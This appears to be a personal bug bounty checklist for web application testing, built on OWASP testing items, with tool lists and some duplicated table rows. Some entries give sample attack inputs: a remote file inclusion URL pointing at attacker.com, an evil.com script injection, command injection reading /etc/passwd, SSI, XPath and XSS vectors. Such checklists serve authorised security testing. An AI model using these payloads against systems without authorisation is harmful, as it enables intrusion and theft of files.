# mychecklist


# Bug Bounty Checklist for Web App

> This checklist may help you to have a good methodology for bug bounty hunting  
When you have done a action, don't forget to check ;)  
Happy hunting !  

## Table of Contents

* [Recon on wildcard domain](#"Recon_on_wildcard_domain")
* [Single domain](#Single_domain)
* [Information Gathering](#Information)
* [Configuration Management](#Configuration)
* [Secure Transmission](#Transmission)
* [Authentication](#Authentication)
* [Session Management](#Session)
* [Authorization](#Authorization)
* [Data Validation](#Validation)
* [Denial of Service](#Denial)
* [Business Logic](#Business)
* [Cryptography](#Cryptography)
* [Risky Functionality - File Uploads](#File)
* [Risky Functionality - Card Payment](#Card)
* [HTML 5](#HTML)


## <a name="Recon_on_wildcard_domain">Recon on wildcard domain</a>  
This recon process is from [0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)

- [ ] Run Amass
- [ ] Run Subfinder
- [ ] Run Rapid7 FDNS
- [ ] Use commonspeak2 list
- [ ] Run massdns
- [ ] Run altdns
- [ ] Run massdns
- [ ] WHATWEB


## <a name="Single_domain">Single Domain</a>  

### Scanning  

- [ ] Arachni Scan  
- [ ] Burp Spider  
- [ ] Burp Scanning 
- [ ] Dirsearch  
- [ ] Wayback machine  
- [ ] Linkfinder  
- [ ] Url with Android application   

### Manual checking  

- [x] Shodan https://www.shodan.io/ 
- [ ] Censys  
- [ ] Google dorks https://www.exploit-db.com/google-hacking-database 
- [ ] https://intelx.io 
- [ ] Pastebin  
- [ ] Github https://github.comInformation Gathering	Test Name	Description	Tools
- [ ]  -INFO-001	Conduct Search Engine Discovery and Reconnaissance for Information Leakage	Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.	Google Hacking, Sitedigger, Shodan, FOCA, Punkspider
- [ ]  -INFO-002	Fingerprint Web Server	"Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using
""HTTP header field ordering"" and ""Malformed requests test""."	Httprint, Httprecon, Desenmascarame
- [ ]  -INFO-003	Review Webserver Metafiles for Information Leakage	Analyze robots.txt and identify <META> Tags from website.	Browser, curl, wget
- [ ]  -INFO-004	Enumerate Applications on Webserver	Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers	Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue
- [ ]  -INFO-005	Review Webpage Comments and Metadata for Information Leakage	Find sensitive information from webpage comments and Metadata on source code.	Browser, curl, wget
- [ ]  -INFO-006	Identify application entry points	Identify from hidden fields, parameters, methods HTTP header analysis	Burp proxy, ZAP, Tamper data
- [ ]  -INFO-007	Map execution paths through application	Map the target application and understand the principal workflows.	Burp proxy, ZAP
- [ ]  -INFO-008	Fingerprint Web Application Framework	Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.	Whatweb, BlindElephant, Wappalyzer
- [ ]  -INFO-009	Fingerprint Web Application	Identify the web application and version to determine known vulnerabilities and the appropriate exploits.	Whatweb, BlindElephant, Wappalyzer, CMSmap
- [ ]  -INFO-010	Map Application Architecture	Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database	Browser, curl, wget
			
Configuration and Deploy Management Testing	Test Name	Description	Tools
- [ ]  -CONFIG-001	Test Network/Infrastructure Configuration	Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.	Nessus
- [ ]  -CONFIG-002	Test Application Platform Configuration	Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.	Browser, Nikto
- [ ]  -CONFIG-003	Test File Extensions Handling for Sensitive Information	Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)	Browser, Nikto
- [ ]  -CONFIG-004	Backup and Unreferenced Files for Sensitive Information	Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename	Nessus, Nikto, Wikto
- [ ]  -CONFIG-005	Enumerate Infrastructure and Application Admin Interfaces	Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)	Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner
- [ ]  -CONFIG-006	Test HTTP Methods	Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST	netcat, curl
- [ ]  -CONFIG-007	Test HTTP Strict Transport Security	"Identify HSTS header on Web server through HTTP response header. 
curl -s -D- https://domain.com/ | grep Strict"	Burp Proxy, ZAP, curl
- [ ]  -CONFIG-008	Test RIA cross domain policy	Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.	Burp Proxy, ZAP, Nikto
			
Identity Management Testing	Test Name	Description	Tools
- [ ]  -IDENT-001	Test Role Definitions	Validate the system roles defined within the application by creating permission matrix.	Burp Proxy, ZAP
- [ ]  -IDENT-002	Test User Registration Process	"Verify that the identity requirements for user registration are aligned
with business and security requirements:"	Burp Proxy, ZAP
- [ ]  -IDENT-003	Test Account Provisioning Process	"Determine which roles are able to provision users and what sort of
accounts they can provision."	Burp Proxy, ZAP
- [ ]  -IDENT-004	Testing for Account Enumeration and Guessable User Account	Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)	Browser, Burp Proxy, ZAP
- [ ]  -IDENT-005	Testing for Weak or unenforced username policy	"User account names are often highly structured (e.g. Joe Bloggs
account name is jbloggs and Fred Nurks account name is fnurks)
and valid account names can easily be guessed."	Browser, Burp Proxy, ZAP
- [ ]  -IDENT-006	Test Permissions of Guest/Training Accounts	Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorisation process required for access.Evaluate consistency between access policy and guest/training account access permissions.	Burp Proxy, ZAP
- [ ]  -IDENT-007	Test Account Suspension/Resumption Process	Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.	Burp Proxy, ZAP
			
Authentication Testing	Test Name	Description	Tools
- [ ]  -AUTHN-001	Testing for Credentials Transported over an Encrypted Channel	Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.	Burp Proxy, ZAP
- [ ]  -AUTHN-002	Testing for default credentials	Testing for default credentials of common applications, Testing for default password of new accounts.	Burp Proxy, ZAP, Hydra
- [ ]  -AUTHN-003	Testing for Weak lock out mechanism	"Evaluate the account lockout mechanism’s ability to mitigate
brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking."	Browser
- [ ]  -AUTHN-004	Testing for bypassing authentication schema	Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection	Burp Proxy, ZAP
- [ ]  -AUTHN-005	Test remember password functionality	Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?	Burp Proxy, ZAP
- [ ]  -AUTHN-006	Testing for Browser cache weakness	Check browser history issue by clicking "Back" button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)	Burp Proxy, ZAP, Firefox add-on CacheViewer2
- [ ]  -AUTHN-007	Testing for Weak password policy	"Determine the resistance of the application against brute force
password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of
passwords."	Burp Proxy, ZAP, Hydra
- [ ]  -AUTHN-008	Testing for Weak security question/answer	Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)	Browser
- [ ]  -AUTHN-009	Testing for weak password change or reset functionalities	Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?	Browser, Burp Proxy, ZAP
- [ ]  -AUTHN-010	Testing for Weaker authentication in alternative channel	Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)	Browser
			
Authorization Testing 	Test Name	Description	Tools
- [ ]  -AUTHZ-001	Testing Directory traversal/file include	dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.	Burp Proxy, ZAP, Wfuzz
- [ ]  -AUTHZ-002	Testing for bypassing authorization schema	Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)	Burp Proxy (Autorize), ZAP
- [ ]  -AUTHZ-003	Testing for Privilege Escalation	Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1	Burp Proxy (Autorize), ZAP
- [ ]  -AUTHZ-004	Testing for Insecure Direct Object References	Force changing parameter value (?invoice=123 -> ?invoice=456)	Burp Proxy (Autorize), ZAP
			
Session Management Testing	Test Name	Description	Tools
- [ ]  -SESS-001	Testing for Bypassing Session Management Schema	SessionID analysis prediction, unencrypted cookie transport, brute-force.	Burp Proxy, ForceSSL, ZAP, CookieDigger
- [ ]  -SESS-002	Testing for Cookies attributes	Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.	Burp Proxy, ZAP
- [ ]  -SESS-003	Testing for Session Fixation	The application doesn't renew the cookie after a successfully user authentication.	Burp Proxy, ZAP
- [ ]  -SESS-004	Testing for Exposed Session Variables	Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?	Burp Proxy, ZAP
- [ ]  -SESS-005	Testing for Cross Site Request Forgery	URL analysis, Direct access to functions without any token.	Burp Proxy (csrf_token_detect), burpy, ZAP
- [ ]  -SESS-006	Testing for logout functionality	Check reuse session after logout both server-side and SSO.	Burp Proxy, ZAP
- [ ]  -SESS-007	Test Session Timeout	Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.	Burp Proxy, ZAP
- [ ]  -SESS-008	Testing for Session puzzling	The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.	Burp Proxy, ZAP
			
Data Validation Testing	Test Name	Description	Tools
- [ ]  -INPVAL-001	Testing for Reflected Cross Site Scripting	Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.	Burp Proxy, ZAP, Xenotix XSS
- [ ]  -INPVAL-002	Testing for Stored Cross Site Scripting	Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF	Burp Proxy, ZAP, BeEF, XSS Proxy
- [ ]  -INPVAL-003	Testing for HTTP Verb Tampering	Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.	netcat
- [ ]  -INPVAL-004	Testing for HTTP Parameter pollution	Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP	ZAP, HPP Finder (Chrome Plugin)
- [ ]  -INPVAL-005	Testing for SQL Injection	Union, Boolean, Error based, Out-of-band, Time delay.	Burp Proxy (SQLipy), SQLMap, Pangolin, Seclists (FuzzDB)
	Oracle Testing	Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection	Orascan, SQLInjector
	MySQL Testing	Identify MySQL version, Single quote, Information_schema, Read/Write file.	SQLMap, Mysqloit, Power Injector
	SQL Server Testing	Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)	SQLMap, SQLninja, Power Injector
	Testing PostgreSQL	Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)	SQLMap
	MS Access Testing	Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.	SQLMap
	Testing for NoSQL injection	Identify NoSQL databases, Pass special characters (' " \ ; { } ), Attack with reserved variable name, operator.	NoSQLMap
- [ ]  -INPVAL-006	Testing for LDAP Injection	"/ldapsearch?user=*
user=*user=*)(uid=*))(|(uid=*
pass=password"	Burp Proxy, ZAP
- [ ]  -INPVAL-007	Testing for ORM Injection	Testing ORM injection is identical to SQL injection testing	Hibernate, Nhibernate
- [ ]  -INPVAL-008	Testing for XML Injection	"Check with XML Meta Characters
', "" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG"	Burp Proxy, ZAP, Wfuzz
- [ ]  -INPVAL-009	Testing for SSI Injection	"• Presense of .shtml extension
• Check for these characters
< ! # = / . "" - > and [a-zA-Z0-9]
• include String = <!--#include virtual=""/etc/passwd"" -->"	Burp Proxy, ZAP
- [ ]  -INPVAL-010	Testing for XPath Injection	"Check for XML error enumeration by supplying a single quote (')
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1"	Burp Proxy, ZAP
- [ ]  -INPVAL-011	IMAP/SMTP Injection	"• Identifying vulnerable parameters with special characters
(i.e.: \, ‘, “, @, #, !, |)
• Understanding the data flow and deployment structure of the client
• IMAP/SMTP command injection (Header, Body, Footer)"	Burp Proxy, ZAP
- [ ]  -INPVAL-012	Testing for Code Injection	"Enter OS commands in the input field.
?arg=1; system('id')"	Burp Proxy, ZAP, Liffy, Panoptic
	Testing for Local File Inclusion	LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)	Burp Proxy, fimap, Liffy
	Testing for Remote File Inclusion	"RFI from malicious URL
?page.php?file=http://attacker.com/malicious_page"	Burp Proxy, fimap, Liffy
- [ ]  -INPVAL-013	Testing for Command Injection	"Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.
%3Bcat%20/etc/passwd
test.pdf+|+Dir C:\"	Burp Proxy, ZAP, Commix
- [ ]  -INPVAL-014	Testing for Buffer overflow	"• Testing for heap overflow vulnerability
• Testing for stack overflow vulnerability
• Testing for format string vulnerability"	Immunity Canvas, Spike, MSF, Nessus
	Testing for Heap overflow		
	Testing for Stack overflow		
	Testing for Format string		
- [ ]  -INPVAL-015	Testing for incubated vulnerabilities	File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)	Burp Proxy, BeEF, MSF
- [ ]  -INPVAL-016	Testing for HTTP Splitting/Smuggling	param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>	Burp Proxy, ZAP, netcat
			
Error Handling	Test Name	Description	Tools
- [ ]  -ERR-001	Analysis of Error Codes	Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)	Burp Proxy, ZAP
- [ ]  -ERR-002	Analysis of Stack Traces	"• Invalid Input / Empty inputs
• Input that contains non alphanumeric characters or query syn
tax
• Access to internal pages without authentication
• Bypassing application flow"	Burp Proxy, ZAP
			
Cryptography	Test Name	Description	Tools
- [ ]  -CRYPST-001	Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection	Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)	testssl.sh, SSL Breacher
- [ ]  -CRYPST-002	Testing for Padding Oracle	"Compare the responses in three different states:
• Cipher text gets decrypted, resulting data is correct.
• Cipher text gets decrypted, resulting data is garbled and causes
some exception or error handling in the application logic.
• Cipher text decryption fails due to padding errors."	PadBuster, Poracle, python-paddingoracle, POET
- [ ]  -CRYPST-003	Testing for Sensitive information sent via unencrypted channels	"Check sensitive data during the transmission:
• Information used in authentication (e.g. Credentials, PINs, Session
identifiers, Tokens, Cookies…)
• Information protected by laws, regulations or specific organizational
policy (e.g. Credit Cards, Customers data)"	Burp Proxy, ZAP, Curl
			
Business logic Testing	Test Name	Description	Tools
- [ ]  -BUSLOGIC-001	Test Business Logic Data Validation	"• Looking for data entry points or hand off points between systems or software.
• Once found try to insert logically invalid data into the application/system. "	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-002	Test Ability to Forge Requests	"• Looking for guessable, predictable or hidden functionality of fields.
• Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow. "	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-003	Test Integrity Checks	"•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.
• For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.
• Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow. "	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-004	Test for Process Timing	"• Looking for application/system functionality that may
be impacted by time. Such as execution time or actions that
help users predict a future outcome or allow one to circumvent
any part of the business logic or workflow. For example, not
completing transactions in an expected time.
• Develop and execute the mis-use cases ensuring that attackers
can not gain an advantage based on any timing."	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-005	Test Number of Times a Function Can be Used Limits	"• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.
• For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times."	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-006	Testing for the Circumvention of Work Flows	"• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.
• For each method develop a misuse case and try to circumvent or perform an action that is ""not acceptable"" per the the business logic workflow. "	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-007	Test Defenses Against Application Mis-use	"Measures that might indicate the application has in-built self-defense:
• Changed responses
• Blocked requests
• Actions that log a user out or lock their account"	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-008	Test Upload of Unexpected File Types	"• Review the project documentation and perform some exploratory testing looking for file types that should be ""unsupported"" by the application/system.
• Try to upload these “unsupported” files an verify that it are properly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. 
PS. file.phtml, shell.phPWND, SHELL~1.PHP"	Burp Proxy, ZAP
- [ ]  -BUSLOGIC-009	Test Upload of Malicious Files	"• Develop or acquire a known “malicious” file.
• Try to upload the malicious file to the application/system and verify that it is correctly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. "	Burp Proxy, ZAP
			
Client Side Testing	Test Name	Description	Tools
- [ ]  -CLIENT-001	Testing for DOM based Cross Site Scripting	Test for the user inputs obtained from client-side JavaScript Objects	Burp Proxy, DOMinator
- [ ]  -CLIENT-002	Testing for JavaScript Execution	"Inject JavaScript code:
www.victim.com/?javascript:alert(1)"	Burp Proxy, ZAP
- [ ]  -CLIENT-003	Testing for HTML Injection	"Send malicious HTML code:
?user=<img%20src='aaa'%20onerror=alert(1)>"	Burp Proxy, ZAP
- [ ]  -CLIENT-004	Testing for Client Side URL Redirect	"Modify untrusted URL input to a malicious site: (Open Redirect)
?redirect=www.fake-target.site "	Burp Proxy, ZAP
- [ ]  -CLIENT-005	Testing for CSS Injection	"Inject code in the CSS context :
•  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])
•  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)"	Burp Proxy, ZAP
- [ ]  -CLIENT-006	Testing for Client Side Resource Manipulation	"External JavaScript could be easily injected in the trusted web site
www.victim.com/#http://evil.com/js.js"	Burp Proxy, ZAP
- [ ]  -CLIENT-007	Test Cross Origin Resource Sharing	"Check the HTTP headers in order to understand how CORS is
used (Origin Header)"	Burp Proxy, ZAP
- [ ]  -CLIENT-008	Testing for Cross Site Flashing	Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil	FlashBang, Flare, Flasm, SWFScan, SWF Intruder
- [ ]  -CLIENT-009	Testing for Clickjacking	Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.	Burp Proxy, ClickjackingTool
- [ ]  -CLIENT-010	Testing WebSockets	Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization	Burp Proxy, Chrome, ZAP, WebSocket Client
- [ ]  -CLIENT-011	Test Web Messaging	Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains	Burp Proxy, ZAP
- [ ]  -CLIENT-012	Test Local Storage	"Determine whether the website is storing sensitive data in the storage. XSS in localstorage 
http://server/StoragePOC.html#<img src=x onerror=alert(1)>"	Chrome, Firebug, Burp Proxy, ZAP

- [ ] OSINT     

### <a name="Information">Information Gathering</a>
- [ ] Manually explore the site  
- [ ] Spider/crawl for missed or hidden content  
- [ ] Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store  
- [ ] Check the caches of major search engines for publicly accessible sites  
- [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)  
- [ ] Perform Web Application Fingerprinting  = WHATWEB
- [ ] Identify technologies used  
- [ ] Identify user roles  
- [ ] Identify application entry points  
- [ ] Identify client-side code  
- [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)  
- [ ] Identify co-hosted and related applications  
- [ ] Identify all hostnames and ports  
- [ ] Identify third-party hosted content  
- [ ] Identify Debug parameters  


### <a name="Configuration">Configuration Management</a>

- [ ] Check for commonly used application and administrative URLs  
- [ ] Check for old, backup and unreferenced files  
- [ ] Check HTTP methods supported and Cross Site Tracing (XST)  
- [ ] Test file extensions handling  
- [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)  
- [ ] Test for policies (e.g. Flash, Silverlight, robots)  
- [ ] Test for non-production data in live environment, and vice-versa  
- [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)  


### <a name="Transmission">Secure Transmission</a>

- [ ] Check SSL Version, Algorithms, Key length  
- [ ] Check for Digital Certificate Validity (Duration, Signature and CN)  
- [ ] Check credentials only delivered over HTTPS  
- [ ] Check that the login form is delivered over HTTPS  
- [ ] Check session tokens only delivered over HTTPS  
- [ ] Check if HTTP Strict Transport Security (HSTS) in use  

### <a name="Authentication">Authentication</a>  



> - [ ] ### [https://www.owasp.org/index.php/Testing_for_authentication]( https://www.owasp.org/index.php/Testing_for_authentication)

- [ ] Test for user enumeration  
- [ ] Test for authentication bypass  
- [ ] Test for brute force protection  
- [ ] Test password quality rules  
- [ ] Test remember me functionality  
- [ ] Test for autocomplete on password forms/input  
- [ ] Test password reset and/or recovery  
- [ ] Test password change process  
- [ ] Test CAPTCHA  
- [ ] Test multi factor authentication  
- [ ] Test for logout functionality presence  
- [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)  
- [ ] Test for default logins  
- [ ] Test for user-accessible authentication history  
- [ ] Test for out-of channel notification of account lockouts and successful password changes  
- [ ] Test for consistent authentication across applications with shared authentication schema / SSO   

### <a name="Session">Session Management</a>
- [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)  
- [ ] Check session tokens for cookie flags (httpOnly and secure)  
- [ ] Check session cookie scope (path and domain)  
- [ ] Check session cookie duration (expires and max-age)  
- [ ] Check session termination after a maximum lifetime  
- [ ] Check session termination after relative timeout  
- [ ] Check session termination after logout  
- [ ] Test to see if users can have multiple simultaneous sessions  
- [ ] Test session cookies for randomness  
- [ ] Confirm that new session tokens are issued on login, role change and logout  
- [ ] Test for consistent session management across applications with shared session management  
- [ ] Test for session puzzling  
- [ ] Test for CSRF and clickjacking  



### <a name="Authorization">Authorization</a>   

> - [ ] **https://www.owasp.org/index.php/Testing_for_Authorization**

- [ ] Test for path traversal  
- [ ] Test for bypassing authorization schema  
- [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)  
- [ ] Test for horizontal Access control problems (between two users at the same privilege level)  
- [ ] Test for missing authorization  


### <a name="Validation">Data Validation</a>
- [ ] Test for Reflected Cross Site Scripting  
- [ ] Test for Stored Cross Site Scripting  
- [ ] Test for DOM based Cross Site Scripting  
- [ ] Test for Cross Site Flashing  
- [ ] Test for HTML Injection  
- [ ] Test for SQL Injection  
- [ ] Test for LDAP Injection  
- [ ] Test for ORM Injection  
- [ ] Test for XML Injection  
- [ ] Test for XXE Injection  
- [ ] Test for SSI Injection  
- [ ] Test for XPath Injection  
- [ ] Test for XQuery Injection  
- [ ] Test for IMAP/SMTP Injection  
- [ ] Test for Code Injection  
- [ ] Test for Expression Language Injection  
- [ ] Test for Command Injection  
- [ ] Test for Overflow (Stack, Heap and Integer)  
- [ ] Test for Format String  
- [ ] Test for incubated vulnerabilities  
- [ ] Test for HTTP Splitting/Smuggling  
- [ ] Test for HTTP Verb Tampering  
- [ ] Test for Open Redirection  
- [ ] Test for Local File Inclusion  
- [ ] Test for Remote File Inclusion  
- [ ] Compare client-side and server-side validation rules  
- [ ] Test for NoSQL injection  
- [ ] Test for HTTP parameter pollution  
- [ ] Test for auto-binding  
- [ ] Test for Mass Assignment  
- [ ] Test for NULL/Invalid Session Cookie  

### <a name="Denial">Denial of Service</a>
- [ ] Test for anti-automation  
- [ ] Test for account lockout  
- [ ] Test for HTTP protocol DoS  
- [ ] Test for SQL wildcard DoS  


### <a name="Business">Business Logic</a>
- [ ] Test for feature misuse  
- [ ] Test for lack of non-repudiation  
- [ ] Test for trust relationships  
- [ ] Test for integrity of data  
- [ ] Test segregation of duties  


### <a name="Cryptography">Cryptography</a>
- [ ] Check if data which should be encrypted is not  
- [ ] Check for wrong algorithms usage depending on context  
- [ ] Check for weak algorithms usage  
- [ ] Check for proper use of salting  
- [ ] Check for randomness functions  


### <a name="File">Risky Functionality - File Uploads</a>
- [ ] Test that acceptable file types are whitelisted  
- [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced  
- [ ] Test that file contents match the defined file type  
- [ ] Test that all file uploads have Anti-Virus scanning in-place.  
- [ ] Test that unsafe filenames are sanitised  
- [ ] Test that uploaded files are not directly accessible within the web root  
- [ ] Test that uploaded files are not served on the same hostname/port  
- [ ] Test that files and other media are integrated with the authentication and authorisation schemas  


### <a name="Card">Risky Functionality - Card Payment</a>
- [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application  
- [ ] Test for default or guessable password  
- [ ] Test for non-production data in live environment, and vice-versa  
- [ ] Test for Injection vulnerabilities  
- [ ] Test for Buffer Overflows  
- [ ] Test for Insecure Cryptographic Storage  
- [ ] Test for Insufficient Transport Layer Protection  
- [ ] Test for Improper Error Handling  
- [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0  
- [ ] Test for Authentication and Authorization issues  
- [ ] Test for CSRF  


### <a name="HTML">HTML 5</a>
- [ ] Test Web Messaging  
- [ ] Test for Web Storage SQL injection  
- [ ] Check CORS implementation  
- [ ] Check Offline Web Application 
- [ ] INFO-002	Fingerprint Web Server	"Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using
""HTTP header field ordering"" and ""Malformed requests test""."	Httprint, Httprecon, Desenmascarame	Not Started	
- [ ]-INFO-003	Review Webserver Metafiles for Information Leakage	Analyze robots.txt and identify <META> Tags from website.	Browser, curl, wget	Not Started	
- [ ]-INFO-004	Enumerate Applications on Webserver	Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers	Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue	Not Started	
- [ ]-INFO-005	Review Webpage Comments and Metadata for Information Leakage	Find sensitive information from webpage comments and Metadata on source code.	Browser, curl, wget	Not Started	
- [ ]-INFO-006	Identify application entry points	Identify from hidden fields, parameters, methods HTTP header analysis	Burp proxy, ZAP, Tamper data	Not Started	
- [ ]-INFO-007	Map execution paths through application	Map the target application and understand the principal workflows.	Burp proxy, ZAP	Not Started	
- [ ]-INFO-008	Fingerprint Web Application Framework	Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.	Whatweb, BlindElephant, Wappalyzer	Not Started	
- [ ]-INFO-009	Fingerprint Web Application	Identify the web application and version to determine known vulnerabilities and the appropriate exploits.	Whatweb, BlindElephant, Wappalyzer, CMSmap	Not Started	
- [ ]-INFO-010	Map Application Architecture	Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database	Browser, curl, wget	Not Started	
					
Configuration and Deploy Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-CONFIG-001	Test Network/Infrastructure Configuration	Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.	Nessus	Not Started	
- [ ]-CONFIG-002	Test Application Platform Configuration	Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.	Browser, Nikto	Not Started	
- [ ]-CONFIG-003	Test File Extensions Handling for Sensitive Information	Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)	Browser, Nikto	Not Started	
- [ ]-CONFIG-004	Backup and Unreferenced Files for Sensitive Information	Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename	Nessus, Nikto, Wikto	Not Started	
- [ ]-CONFIG-005	Enumerate Infrastructure and Application Admin Interfaces	Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)	Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner	Not Started	
- [ ]-CONFIG-006	Test HTTP Methods	Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST	netcat, curl	Not Started	
- [ ]-CONFIG-007	Test HTTP Strict Transport Security	"Identify HSTS header on Web server through HTTP response header. 
curl -s -D- https://domain.com/ | grep Strict"	Burp Proxy, ZAP, curl	Not Started	
- [ ]-CONFIG-008	Test RIA cross domain policy	Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.	Burp Proxy, ZAP, Nikto	Not Started	
					
Identity Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-IDENT-001	Test Role Definitions	Validate the system roles defined within the application by creating permission matrix.	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-002	Test User Registration Process	"Verify that the identity requirements for user registration are aligned
with business and security requirements:"	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-003	Test Account Provisioning Process	"Determine which roles are able to provision users and what sort of
accounts they can provision."	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-004	Testing for Account Enumeration and Guessable User Account	Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)	Browser, Burp Proxy, ZAP	Not Started	
